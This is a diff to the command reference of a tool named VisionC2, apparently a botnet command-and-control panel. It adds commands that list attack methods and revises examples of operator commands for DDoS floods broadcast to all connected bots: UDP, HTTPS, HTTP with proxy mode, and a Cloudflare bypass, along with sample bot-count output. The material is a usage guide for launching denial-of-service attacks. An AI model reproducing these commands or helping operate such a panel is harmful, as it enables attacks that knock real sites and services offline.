@@ -22,7 +22,8 @@ Commands available to all authenticated users.
 | Command | Description |
 |---------|-------------|
 | `help` | Display context-aware help menu based on your permission level |
-| `?` | Quick hint to use help command |
+| `attack` / `methods` | Display all available attack methods |
+| `?` | Quick hint showing help and attack commands |
 | `bots` | List all connected bots with details |
 | `banner` | Redisplay the VisionC2 banner with live stats |
 | `clear` / `cls` | Clear the terminal screen |
@@ -33,7 +34,13 @@ Commands available to all authenticated users.
 
 ```
 [Owner@root]► help
-# Displays full command menu based on your level
+# Displays command menu (general, shell, bot management, etc.)
+
+[Owner@root]► attack
+# Displays all attack methods (L4, L7, proxy mode)
+
+[Owner@root]► ?
+'help' - commands  |  'attack' - attack methods
 
 [Owner@root]► bots
 [Bots: 47]
@@ -95,7 +102,7 @@ All attack commands are broadcast to ALL connected bots simultaneously.
 ⚡ Method: !udpflood
 
 # HTTPS flood against a website
-[Admin@root]► !https https://example.com 443 120
+[Admin@root]► !https example.com 443 120
 
 # HTTP flood with proxy support (L7 only)
 [Admin@root]► !http target.com 443 60 -p https://proxylist.com/proxies.txt
@@ -106,7 +113,7 @@ All attack commands are broadcast to ALL connected bots simultaneously.
 ⚡ Proxy Mode: Enabled (fetching from https://proxylist.com/proxies.txt)
 
 # Cloudflare bypass attack
-[Admin@root]► !cfbypass https://protected-site.com 443 180
+[Admin@root]► !cfbypass protected-site.com 443 180
 
 # Stop all running attacks
 [Admin@root]► !stop
